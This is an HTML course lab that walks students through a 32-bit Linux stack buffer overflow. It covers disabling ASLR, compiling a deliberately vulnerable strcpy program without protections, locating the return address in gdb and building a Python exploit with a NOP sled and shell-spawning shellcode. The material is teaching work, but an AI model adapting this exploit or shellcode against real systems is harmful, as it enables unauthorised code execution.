@@ -1,0 +1,742 @@
+
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Proj: Linux Buffer Overflow With Shellcode </title>
+</head>
+<body bgcolor="#cccccc">
+<h1>Proj: Linux Buffer Overflow With Shellcode </h1>
+<h2>What You Need</h2>
+A 32-bit x86 Kali 2 Linux machine(Any linux), real or virtual. The project works in a very
+similar manner on Kali 1. USE ANY editor of your choosing... The example uses "Nano"
+<h2>Purpose</h2>
+To develop a very simple buffer overflow
+exploit in Linux. This will give you
+practice with these techniques:
+<ul>
+<li>Writing very simple C code
+</li><li>Compiling with gcc
+</li><li>Debugging with gdb
+</li><li>Understanding the registers $esp, $ebp, and $eip
+</li><li>Understanding the structure of the stack
+</li><li>Using Python to create simple text patterns
+</li><li>Editing a binary file with hexedit
+</li><li>Using a NOP sled
+</li></ul>
+<h2>Observing ASLR</h2>
+Address Space Layout Randomization is
+a defense feature to make buffer
+overflows more difficult, and Kali Linux
+uses it by default.
+<p>
+To see what it does, we'll use a
+simple C program that shows the value
+of $esp -- the Extended Stack Pointer.
+</p><p>
+To make sure ASLR is enabled, execute this command:
+</p><blockquote><pre><code><big><b>
+echo 1 &gt; /proc/sys/kernel/randomize_va_space
+</b></big></code></pre></blockquote>
+In a Terminal, execute this command:
+<blockquote><pre><code><big><b>
+nano esp.c
+</b></big></code></pre></blockquote>
+Enter this code, as shown below:
+<blockquote><pre><code><big><b>
+#include &lt;stdio.h&gt;
+void main() {
+        register int i asm("esp");
+        printf("$esp = %#010x\n", i);
+}
+</b></big></code></pre></blockquote>
+<p>
+<img src="./Proj _ Linux Buffer Overflow With Shellcode_files/lbuf1-25.png">
+</p><p>
+Save the file with <b>Ctrl+X</b>,
+<b>Y</b>, <b>Enter</b>.
+</p><p>
+</p><p>
+In a Terminal, execute these commands:
+</p><blockquote><pre><code><big><b>
+gcc -o esp esp.c
+./esp
+./esp
+./esp
+</b></big></code></pre></blockquote>
+Each time you run the program,
+esp changes, as shown below:
+<p>
+<img src="./Proj _ Linux Buffer Overflow With Shellcode_files/lbuf1-26.png">
+</p><p>
+This makes you much safer, but it's
+an irritation we don't need for this
+project, so we'll turn it off.
+</p><h2>Disabling ASLR</h2>
+Fortunately, it's easy to temporarily
+disable ASLR in Kali Linux.
+<p>
+In a Terminal, execute these commands:
+</p><blockquote><pre><code><big><b>
+echo 0 &gt; /proc/sys/kernel/randomize_va_space
+./esp
+./esp
+./esp
+</b></big></code></pre></blockquote>
+Now esp is always the same, as shown below:
+<p>
+<img src="./Proj _ Linux Buffer Overflow With Shellcode_files/lbuf1-27a.png">
+</p><p>
+</p><h2>Creating a Vulnerable Program</h2>
+This program does nothing useful, but
+it's very simple. It takes a single
+string argument, copies it to a
+buffer, and then prints "Done!".
+<p>
+This program has the overflow in
+a function, not in main(), because
+<a href="https://stackoverflow.com/questions/31986411/how-to-disable-possible-stack-smashing-protection-eip-is-not-being-overwritten">main() has a special stack format
+that breaks this simple attack</a>.
+</p><p>
+In a Terminal window,
+execute this command:
+</p><blockquote><pre><code><big><b>
+nano bo1.c
+</b></big></code></pre></blockquote>
+Enter this code:
+<blockquote><pre><code><big><b>
+#include &lt;string.h&gt;
+#include &lt;stdio.h&gt;
+void main(int argc, char *argv[]) {
+	copier(argv[1]);
+	printf("Done!\n");
+}
+int copier(char *str) {
+	char buffer[100];
+	strcpy(buffer, str);
+}
+</b></big></code></pre></blockquote>
+<p>
+<img src="./Proj _ Linux Buffer Overflow With Shellcode_files/p3-lbuf1a.png">
+</p><p>
+Save the file with <b>Ctrl+X</b>, <b>Y</b>,
+<b>Enter</b>.
+</p><p>
+Execute these commands to compile the code
+without modern protections against stack
+overflows, and run it with an argument of "A":
+
+</p><blockquote><pre><code><big><b>
+gcc -g -z execstack -no-pie -o bo1 bo1.c
+./bo1 A
+</b></big></code></pre></blockquote>
+There may be warnings from the compiler,
+but there should be no errors.
+<p>
+The code exits normally, wth the
+"Done!" message, as shown below.
+</p><p>
+<img src="./Proj _ Linux Buffer Overflow With Shellcode_files/p3-lbuf1q.png">
+</p><p>
+</p><h2>Using Python to Create an Exploit File</h2>
+In a Terminal window,
+execute this command:
+<blockquote><pre><code><big><b>
+nano b1
+</b></big></code></pre></blockquote>
+Type in the code shown below.
+<p>
+The first line indicates that this is a
+Python program, and the second line prints
+116 'A' characters.
+</p><blockquote><pre><code><big><b>
+#!/usr/bin/python 
+print 'A' * 116
+</b></big></code></pre></blockquote>
+<p>
+<img src="./Proj _ Linux Buffer Overflow With Shellcode_files/lbuf1-28.png">
+</p><p>
+Save the file with <b>Ctrl+X</b>, <b>Y</b>,
+<b>Enter</b>.
+</p><p>
+Next we need to make the program
+executable and run it.
+</p><p>
+In a Terminal window,
+execute these commands.
+</p><blockquote><pre><code><big><b>
+chmod a+x b1
+./b1
+</b></big></code></pre></blockquote>
+The program prints out 116 'A' characters,
+as shown below.
+<p>
+<img src="./Proj _ Linux Buffer Overflow With Shellcode_files/lbuf1-29.png">
+</p><p>
+Now we need to put the output in a file
+named e1.
+</p><p>
+In a Terminal window,
+execute these commands.
+</p><p>
+<i>Note that the second command is
+"LS -L E*" in lowercase characters.</i>
+</p><blockquote><pre><code><big><b>
+./b1 &gt; e1
+ls -l e1
+</b></big></code></pre></blockquote>
+This creates a file named "e1"
+containing 116 "A" characters and a
+line feed, for a total of 117 characters,
+as shown below.
+<p>
+<img src="./Proj _ Linux Buffer Overflow With Shellcode_files/lbuf1-31.png">
+</p><p>
+</p><h2>Overflowing the Stack</h2>
+In a Terminal window,
+execute this command.
+<p>
+<i>
+Note: the "$(cat e1)" portion of this
+command prints out the contents of the
+e1 file and feeds it to the program as a
+command-line argument. A more common way
+to do the same thing is with the
+input redirection operator:
+"./bo1 &lt; e1". However, that technique
+gave different results in the command-line
+and the debugger, so the $() construction is
+better for this project.</i>
+</p><blockquote><pre><code><big><b>
+./bo1 $(cat e1)
+</b></big></code></pre></blockquote>
+The program crashes with
+a "Segmentation fault" message,
+as shown below.
+<p>
+<img src="./Proj _ Linux Buffer Overflow With Shellcode_files/p3-lbuf1b.png">
+</p><p>
+The strcpy() operation corrupts
+ths stack, so the program cannot
+return from copier() to main().
+</p><p>
+As it is, this is a DoS exploit--it
+causes the program to crash.
+</p><p>
+Our next task is to convert this
+DoS exploit into a Code Execution
+exploit.
+</p><p>
+To do that, we need to analyze what
+caused the segmentation fault, and
+control it.
+</p><h2>Debugging the Program</h2>
+Execute these commands to run the file
+in the gdb debugging environment,
+list the source code, and set a breakpoint:
+<blockquote><pre><code><big><b>
+gdb -q bo1
+list
+break 10
+</b></big></code></pre></blockquote>
+Because this file was compiled with symbols,
+the C source code is visible in the
+debugger, with handy line numbers,
+as shown below.
+<p>
+The "break 10" command tells the debugger
+to stop before executing line 10,
+so we can examine the state of
+the processor and memory. At line
+10, the strcpy() operation is done,
+but the program has not attempted
+to return from copier() yet.
+</p><p>
+<img src="./Proj _ Linux Buffer Overflow With Shellcode_files/p3-lbuf1c.png">
+</p><p>
+</p><h2>Normal Execution</h2>
+In the gdb debugging environment,
+execute these commands:
+<blockquote><pre><code><big><b>
+run A
+info registers
+</b></big></code></pre></blockquote>
+The code runs to the breakpoint,
+and shows the registers, as shown below.
+(Your values may be different from the
+ones shown in the image below.)
+<p>
+The important registers for us now
+are:
+</p><ul>
+<li>$esp (the top of the stack)
+</li><li>$ebp (the bottom of the stack)
+</li></ul>
+<p>
+<img src="./Proj _ Linux Buffer Overflow With Shellcode_files/p3-lbuf1d.png">
+</p><p>
+In the gdb debugging environment,
+execute this command:
+</p><blockquote><pre><code><big><b>
+x/40x $esp
+</b></big></code></pre></blockquote>
+This command is short for
+"eXamine 40 heXadecimal words, starting at
+$esp". It shows the stack. Find these items,
+as shown below:
+<ul>
+<li>Use the mouse to highlight the words from the start through
+your $ebp value, as shown below. The highlighted region is the stack frame for main(). It starts at the 32-bit word pointed to by $esp and continues through the 32-bit word pointed to by $ebp.
+</li><li>The bytes highlighted in yellow are the input string: "A" (41 in ANSI) followed by a null byte (00) to terminate the string. Note that strings are placed in the stack backwards, in a right-to-left fashion.
+</li><li>The word in the green box is the first word after
+$ebp. This is the <b>return address</b> -- the address
+of the next instruction to be executed after main()
+returns. Controlling this value is essential for the exploit.
+</li></ul>
+<p>
+<img src="./Proj _ Linux Buffer Overflow With Shellcode_files/p3-lbuf1e.png">
+</p><p>
+</p><h2>Overflowing the Stack with "A" Characters</h2>
+In the gdb debugging environment,
+execute this command:
+<blockquote><pre><code><big><b>
+run $(cat e1)
+</b></big></code></pre></blockquote>
+gdb warns you that a program is already
+running. At the "Start it from the
+beginning? (y or n)" prompt, type
+<b>y</b> and then press <b>Enter</b>.
+<p>
+The program runs to the breakpoint.
+</p><p>
+In the gdb debugging environment,
+execute these commands:
+</p><blockquote><pre><code><big><b>
+info registers
+x/40x $esp
+</b></big></code></pre></blockquote>
+Find these items in your
+display,as shown below:
+<ul>
+<li>The highlighted region is the stack frame for main(),
+starting at $esp and ending at $ebp.
+</li><li>The stack contains a long string of "41" values, because the input was a long string of "A" characters.
+</li><li>The word in the green box is the <b>return address</b> -- it's now full of "41" values too.
+</li></ul>
+<p>
+<img src="./Proj _ Linux Buffer Overflow With Shellcode_files/p3-lbuf1f.png">
+</p><p>
+</p><h2>Quitting the Debugger</h2>
+In the gdb debugging environment,
+execute this command:
+<blockquote><pre><code><big><b>
+quit
+</b></big></code></pre></blockquote>
+At the "Quit anyway? (y or n)" prompt,
+type <b>y</b> and press <b>Enter</b>.
+<p>
+</p><h2>Installing Hexedit</h2>
+In a Terminal window, execute
+these commands:
+<blockquote><pre><code><big><b>
+apt update
+apt install hexedit -y
+</b></big></code></pre></blockquote>
+<h2>Targeting the Return Address</h2>
+In a Terminal window, execute
+these commands:
+<blockquote><pre><code><big><b>
+cp e1 e2
+hexedit e2
+</b></big></code></pre></blockquote>
+This copies your DoS exploit file e1 to
+a new file named e2, and starts it in the
+hexedit hexadecimal editor.
+<p>
+In the hexedit window, carefully change
+the last 4 '41' bytes from "41 41 41 41"
+to "31 32 33 34", as shown below.
+</p><p>
+<img src="./Proj _ Linux Buffer Overflow With Shellcode_files/p3-lbuf1g.png">
+</p><p>
+Save the file with <b>Ctrl+X</b>, <b>Y</b>.
+</p><p>
+</p><h2>Testing Exploit 2 in the Debugger</h2>
+In a Terminal window, execute these
+commands:
+<blockquote><pre><code><big><b>
+gdb -q bo1
+break 10
+run $(cat e2)
+info registers
+x/40x $esp
+</b></big></code></pre></blockquote>
+As you can see, the return address is now
+0x34333231, as outlined in green in the
+image below.
+<p>
+This means you can control execution by
+placing the correct four bytes here,
+in reverse order.
+</p><p>
+However, there must be exactly 112 bytes
+before the four bytes that will end up
+in $eip.
+</p><p>
+<img src="./Proj _ Linux Buffer Overflow With Shellcode_files/p3-lbuf1h.png">
+</p><p>
+</p><h2>Saving a Screen Image</h2>
+Make sure <b>34333231</b> is visible, as shown above.
+<p>
+Press the <b>PrintScrn</b> key to copy the whole desktop to the clipboard.
+</p><p>
+<b>YOU MUST SUBMIT A FULL-SCREEN IMAGE FOR FULL CREDIT!</b>
+</p><p>
+Paste the image into Paint.
+</p><p>
+Save the document with the filename "<b>YOUR NAME Proj 3a</b>", replacing "YOUR NAME" with your real name.
+</p><h2>Quitting the Debugger</h2>
+In the gdb debugging environment,
+execute this command:
+<blockquote><pre><code><big><b>
+quit
+</b></big></code></pre></blockquote>
+At the "Quit anyway? (y or n)" prompt,
+type <b>y</b> and press <b>Enter</b>.
+<h2>Getting Shellcode</h2>
+The shellcode is the payload of the exploit.
+It can do anything you want, but it must not
+contain any null bytes (00) because they
+would terminate the string prematurely and
+prevent the buffer from overflowing.
+<p>
+For this project, I am using shellcode
+that spawns a "dash" shell from
+this page:
+</p><p>
+<a href="http://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html">http://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html</a>
+</p><p>
+Of course, you are already root on Kali Linux,
+so this exploit doesn't really accomplish anything,
+but it's a way to see that you have exploited
+the program.
+</p><p>
+The shellcode used to spawn a "dash" shell is as follows:
+</p><blockquote><pre><code><big><b>
+\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89
+\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80
+</b></big></code></pre></blockquote>
+This shellcode is 32 bytes long.
+<h2>Understanding a NOP Sled</h2>
+There are some imperfections
+in the debugger, so an exploit that works
+in gdb may fail in a real Linux shell.
+This happens because environment variables
+and other details may cause the
+location of the
+stack to change slightly.
+<p>
+The usual solution for this problem is a
+NOP Sled--a long series of "90" bytes,
+which do nothing when processed and proceed
+to the next instruction.
+</p><p>
+For this exploit, we'll use a 64-byte
+NOP Sled.
+</p><h2>Constructing the Exploit</h2>
+In a Terminal window,
+execute this command:
+<blockquote><pre><code><big><b>
+nano b3
+</b></big></code></pre></blockquote>
+Type in the code shown below.
+<blockquote><table border="1" cellpadding="10"><tbody><tr><td>
+<h2>Line by Line Explanation</h2>
+The first statement indicates that this is a
+Python program
+<p>
+The second statement puts
+64 '\x90' (hexadecimal 90) characters into
+a variable named "nopsled"
+</p><p>
+The third statement places the 32-byte shellcode
+into a variable named "shellcode". This statement
+is several lines long.
+</p><p>
+The fourth statement makes a variable named "padding"
+that is long enough to bring the total
+to 112 bytes
+</p><p>
+The fifth statement makes a variable named
+eip that contains the bytes I want to
+inject into the $eip register:
+'1234', at this point.
+</p><p>
+The sixth statement prints it all out in order.
+</p></td></tr></tbody></table>
+</blockquote>
+<blockquote><pre><code><big><b>
+#!/usr/bin/python 
+
+nopsled = '\x90' * 64 
+shellcode = (
+'\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2' +
+'\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89' +
+'\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
+)
+padding = 'A' * (112 - 64 - 32)
+eip = '1234'
+print nopsled + shellcode + padding + eip
+</b></big></code></pre></blockquote>
+<p>
+<img src="./Proj _ Linux Buffer Overflow With Shellcode_files/lbuf1-32.png">
+</p><p>
+Save the file with <b>Ctrl+X</b>, <b>Y</b>,
+<b>Enter</b>.
+</p><p>
+Next we need to make the program
+executable and run it.
+</p><p>
+In a Terminal window,
+execute these commands.
+</p><blockquote><pre><code><big><b>
+chmod a+x b3
+
+./b3 &gt; e3
+
+hexedit e3
+</b></big></code></pre></blockquote>
+The exploit should look exactly
+like the image below.
+<p>
+<img src="./Proj _ Linux Buffer Overflow With Shellcode_files/lbuf1-33a.png">
+</p><p>
+</p><p>
+Close the file with <b>Ctrl+X</b>.
+</p><h2>Testing Exploit 3 in gdb</h2>
+In a Terminal window, execute these
+commands:
+<blockquote><pre><code><big><b>
+gdb bo1
+break 10
+run $(cat e3)
+info registers
+x/40x $esp
+</b></big></code></pre></blockquote>
+This loads the exploit, executes it,
+and stops so we can see the stack.
+<p>
+Find these items:
+</p><ul>
+<li>The shellcode, as highlighted in red in the
+image below
+</li><li>The NOP Sled--the "90" values before the shellcode (highligted in yellow)
+</li><li>The "A" characters--the "41" values after the shellcode (highligted in blue)
+</li><li>The return pointer, outlined in green in the image below, with a value of 0x34333231
+</li></ul>
+<p>
+<img src="./Proj _ Linux Buffer Overflow With Shellcode_files/p3-lbuf1i.png">
+</p><p>
+</p><h2>Choosing an Address</h2>
+You need to choose an address to
+put into $eip. If everything were
+perfect, you could simply use the
+address of the first byte of the
+shellcode. However, to give us some
+room for error, choose an address somewhere
+in the middle of the NOP sled.
+<p>
+In the figure above, a good address
+to use is
+</p><blockquote><pre><code><big><b>
+0xbffff370
+</b></big></code></pre></blockquote>
+Choose an appropriate address for your system.
+It will probably be different.
+<h2>Quitting the Debugger</h2>
+In the gdb debugging environment,
+execute this command:
+<blockquote><pre><code><big><b>
+quit
+</b></big></code></pre></blockquote>
+At the "Quit anyway? (y or n)" prompt,
+type <b>y</b> and press <b>Enter</b>.
+<h2>Inserting the Correct Address Into the Exploit</h2>
+We need to change eip to 0xbffff370.
+However, since the Intel x86 processor
+is "little-endian", the least significant
+byte of the address comes first,
+so we need to reverse the order
+of the bytes, like this:
+<blockquote><pre><code><big><b>
+eip = '\x70\xf3\xff\xbf'
+</b></big></code></pre></blockquote>
+In the Terminal,
+execute these commands:
+<blockquote><pre><code><big><b>
+cp b3 b4
+
+nano b4
+</b></big></code></pre></blockquote>
+Change the address in eip to match the
+code and image below:
+<blockquote><pre><code><big><b>
+#!/usr/bin/python 
+
+nopsled = '\x90' * 64 
+shellcode = (
+'\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2' +
+'\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89' +
+'\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
+)
+padding = 'A' * (112 - 64 - 32)
+eip = '\x70\xf3\xff\xbf'
+print nopsled + shellcode + padding + eip
+</b></big></code></pre></blockquote>
+<p>
+<img src="./Proj _ Linux Buffer Overflow With Shellcode_files/p3-lbuf1j.png">
+</p><p>
+Save the file with <b>Ctrl+X</b>, <b>Y</b>,
+<b>Enter</b>.
+</p><p>
+Next we need to make the program
+executable and run it.
+</p><p>
+In a Terminal window,
+execute these commands.
+</p><blockquote><pre><code><big><b>
+chmod a+x b4
+
+./b4 &gt; e4
+
+hexedit e4
+</b></big></code></pre></blockquote>
+The exploit should look
+like the image below, except for the four bytes
+near the end which are probably different on
+your system.
+<p>
+<img src="./Proj _ Linux Buffer Overflow With Shellcode_files/p3-lbuf1k.png">
+</p><p>
+</p><p>
+Close the file with <b>Ctrl+X</b>.
+</p><h2>Testing Exploit 4 in gdb</h2>
+In a Terminal window, execute these
+commands:
+<blockquote><pre><code><big><b>
+gdb bo1
+break 10
+run $(cat e4)
+info registers
+x/40x $esp
+</b></big></code></pre></blockquote>
+This loads the exploit, executes it,
+and stops so we can see the stack.
+<p>
+Now the return address is 0xbffff370, as
+shown below. That should work!
+</p><p>
+<img src="./Proj _ Linux Buffer Overflow With Shellcode_files/p3-lbuf1l.png">
+</p><p>
+In the gdb window, execute this command:
+</p><blockquote><pre><code><big><b>
+continue
+</b></big></code></pre></blockquote>
+The exploit works, executing a new program
+"/bin/dash", as shown below.
+<p>
+(You may see an "Error in re-setting breakpoint"
+message. but that doesn't matter as long as you
+get the "#"prompt shown below.
+</p><p>
+<img src="./Proj _ Linux Buffer Overflow With Shellcode_files/p3-lbuf1m.png">
+</p><p>
+We now have a working buffer overflow exploit,
+that returns a shell.
+</p><h2>Exiting the Dash Shell</h2>
+At the dash shell "#" prompt,
+execute this command:
+<blockquote><pre><code><big><b>
+exit
+</b></big></code></pre></blockquote>
+<h2>Quitting the Debugger</h2>
+In the gdb debugging environment,
+execute this command:
+<blockquote><pre><code><big><b>
+quit
+</b></big></code></pre></blockquote>
+<h2>Testing Exploit 4 in the Normal Shell</h2>
+In the Terminal window,
+execute this command:
+<blockquote><pre><code><big><b>
+./bo1 $(cat e4)
+</b></big></code></pre></blockquote>
+If the exploit works, you will see the
+"#" prompt,
+as shown below.
+<p>
+<img src="./Proj _ Linux Buffer Overflow With Shellcode_files/lbuf1-24.png">
+</p><p>
+</p><h2>Adjusting the Exploit</h2>
+When I did it with these values,
+the exploit worked in gdb but not
+in the real shell.
+That's a common occurrence, and the
+reason for the NOP sled. If that happens
+to you, adjust the return value in the
+exploit file using hexedit until it works.
+<p>
+To make it work on an earlier version of Kali,
+I had to subtract 0x50 from the address,
+making the last byte 0x20, as shown below.
+</p><p>
+To make it work on Kali 2017.3, I had to add
+0x20 to the address. It seems very random.
+</p><p>
+<img src="./Proj _ Linux Buffer Overflow With Shellcode_files/p3-lbuf1n.png">
+</p><p>
+The exploit now works in the real shell!
+</p><p>
+<img src="./Proj _ Linux Buffer Overflow With Shellcode_files/p3-lbuf1o.png">
+</p><p>
+</p><h2>Saving a Screen Image</h2>
+Make sure the dash prompt of <b>#</b> is visible, as shown above.
+<p>
+Press the <b>PrintScrn</b> key to copy the whole desktop to the clipboard.
+</p><p>
+<b>YOU MUST SUBMIT A FULL-SCREEN IMAGE FOR FULL CREDIT!</b>
+</p><p>
+Save the document with the filename "<b>YOUR NAME Project Shellcode</b>", replacing "YOUR NAME" with your real name.
+</p><h2>Turning in your Project</h2>
+Email the images
+to <b>submit on SLACK "SUBMISSION" channel</b> 
+<h2>Sources</h2>
+<a href="http://www.nostarch.com/pentesting">Penetration Testing</a>
+<p>
+<a href="https://www.offensive-security.com/metasploit-unleashed/Msfpayload">http://www.offensive-security.com/metasploit-unleashed/Msfpayload</a>
+</p><p>
+<a href="https://www.offensive-security.com/metasploit-unleashed/Generating_Payloads">http://www.offensive-security.com/metasploit-unleashed/Generating_Payloads</a>
+</p><p>
+<a href="https://isisblogs.poly.edu/2011/04/13/cheatsheet-using-msf-to-make-linux-shellcode/">https://isisblogs.poly.edu/2011/04/13/cheatsheet-using-msf-to-make-linux-shellcode/</a>
+</p><p>
+<a href="http://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html">http://www.tenouk.com/Bufferoverflowc/Bufferoverflow6.html</a>
+</p><p>
+<a href="https://stackoverflow.com/questions/14344654/how-to-use-debug-libraries-on-ubuntu">http://stackoverflow.com/questions/14344654/how-to-use-debug-libraries-on-ubuntu</a>
+</p><p>
+<a href="https://stackoverflow.com/questions/15306090/cant-step-into-string-h-function-with-gdb">http://stackoverflow.com/questions/15306090/cant-step-into-string-h-function-with-gdb</a>
+</p><p>
+<a href="https://askubuntu.com/questions/180207/reading-source-of-strlen-c">http://askubuntu.com/questions/180207/reading-source-of-strlen-c</a>
+</p><p>
+<a href="https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization">
+http://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization</a>
+</p><p>
+<a href="https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it">http://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it</a>
+</p><p>
+<a href="https://security.stackexchange.com/questions/33293/can-exploit-vulnerability-if-program-started-with-gdb-but-segfaults-if-started">http://security.stackexchange.com/questions/33293/can-exploit-vulnerability-if-program-started-with-gdb-but-segfaults-if-started</a>
+</p><p>
+</p><hr>
+ Revised 2/25/19<br>
+<br>
+ <br>
+ <br>
+ <br>
+
+
+</body></html>
